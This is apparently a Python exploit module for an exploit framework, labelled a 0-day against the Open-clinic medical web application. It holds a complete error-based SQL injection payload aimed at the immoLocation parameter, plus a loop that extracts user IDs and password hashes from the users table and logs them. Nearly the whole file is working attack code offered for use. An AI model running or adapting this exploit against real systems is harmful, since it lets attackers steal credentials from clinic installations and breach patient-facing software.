#!/usr/bin/env python
import re
import urllib2
import cookielib
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_openclinic_sqli"
INFO['DESCRIPTION'] = "Open-clinic blind error-based SQLi [0-day]"
INFO['VENDOR'] = "https://sourceforge.net/projects/open-clinic/?source=typ_redirect"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    When an attacker exploits SQL injection by entering wrong data to fields, 
    the web application displays error messages from the database complaining 
    that the SQL Query's syntax is incorrect.

    Checked on version 4.125.08b
    """
INFO["DOWNLOAD_LINK"] = "https://sourceforge.net/projects/open-clinic/files/latest/download?source=typ_redirect"
INFO["LINKS"] = []
INFO['CHANGELOG']="18 Feb, 2016. Written by Gleg team."
INFO['PATH'] = "WEB/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.0.101"
OPTIONS["PORT"] = 10080
OPTIONS["VHOST"] = "openclinic"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.vuln_path = 'main.do?Page=util%2FlistImmoLabels.jsp&ts=-260082320'
        self.payload = "Action=find&immoLocation=11'||(SELECT '1' FROM DUAL WHERE 666=666 AND (SELECT 777 FROM(SELECT COUNT(*),CONCAT(0x7176767871,(SELECT MID((IFNULL(CAST({field} AS CHAR),0x20)),1,54) FROM ocadmin_dbo.users ORDER BY userid LIMIT {index},1),0x7162787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a))||'"

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.vhost = self.args.get("VHOST", OPTIONS["VHOST"])
        self.vhost = self.vhost if not self.vhost.endswith("/") else self.vhost[0:-1]
        self.url = "http://{}:{}/{}/".format(self.host, self.port, self.vhost)
        self.cookies_path = self.url + "login.jsp"

    def get_credentials(self, opener, index):
        url = self.url + self.vuln_path
        creds = ""
        for field in ["userid", "hex(encryptedpassword)"]:
            data = self.payload.format(field=field, index=index)
            res = opener.open(url, data)
            m = re.search('qvvxq(.+?)qbxvq1', res.read())
            if not m:
                return None
            creds += m.group(1)
            creds += "|"
        return creds[:-1]


    def run(self):
        #Get options from gui
        self.args()
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))        
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        opener.open(self.cookies_path)
        self.log("Credentials:")
        self.log("Login:.......SHA-1 Password:")
        index = 0
        while 1:
            creds = self.get_credentials(opener, index)
            if not creds:
                if index == 0:
                    self.log("No credentials found")
                    self.finish(False)
                else:
                    self.finish(True)
            self.log(".......".join(creds.split('|')))
            index += 1
        return 1


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
